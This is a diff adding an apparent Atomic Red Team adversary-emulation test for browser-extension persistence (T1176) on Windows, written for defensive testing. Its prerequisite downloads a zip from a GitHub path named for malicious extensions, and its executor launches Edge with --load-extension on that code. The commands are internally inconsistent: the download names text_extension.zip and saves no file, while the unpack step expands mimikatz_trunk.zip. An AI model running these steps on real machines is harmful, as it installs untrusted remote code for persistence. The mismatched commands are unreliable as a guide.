@@ -1,0 +1,27 @@
+attack_technique: T1176
+display_name: Browser Extensions
+atomic_tests:
+- name: Command Line Extension Load
+  auto_generated_guid: 0a852024-636f-4dd9-a98e-4f08d26b8f98
+  description: |
+    Launches Edge with load-extension command line.
+  supported_platforms:
+  - windows
+  input_arguments:
+    path_to_extension:
+      description: Path to extension directory
+      type: path
+      default: PathToAtomicsFolder\load_malicious_extensions\src
+    
+  dependency_executor_name: powershell
+  dependencies:
+    - description: Test if executable exists
+      prereq_command: |
+        if(Test-Path "#{path_to_extension}\content.js") {exit 0} else {exit 1}
+      get_prereq_command: |
+        Invoke-WebRequest "https://github.com/Inovasys-CS/EDI/raw/main/persistence/loading_malicious_extensions/bin/text_extension.zip"
+        Expand-Archive -Path .\mimikatz_trunk.zip -DestinationPath #{path_to_extension}
+  executor:
+    command: |
+      Start-Process msedge.exe --load-extension="#{path_to_extension}\"
+    name: powershell
